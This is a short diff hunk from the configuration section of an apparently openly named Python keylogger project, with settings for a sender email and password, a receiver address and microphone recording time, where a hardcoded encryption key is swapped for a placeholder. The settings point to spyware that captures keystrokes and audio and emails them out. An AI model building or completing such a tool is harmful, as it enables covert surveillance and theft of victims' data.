@@ -42,7 +42,7 @@ email_address="sender address"
 password="of above email"
 toaddr="receiver address"
 mic_time=10
-key="kconmfJtFDon1z4cao6bUWzjdIsjKUKXw6g4j0HLec4="
+key="add generatedkey"
 
 file_path = "D:\\PycharmProjects\\Keylogger"
 extend = "\\"
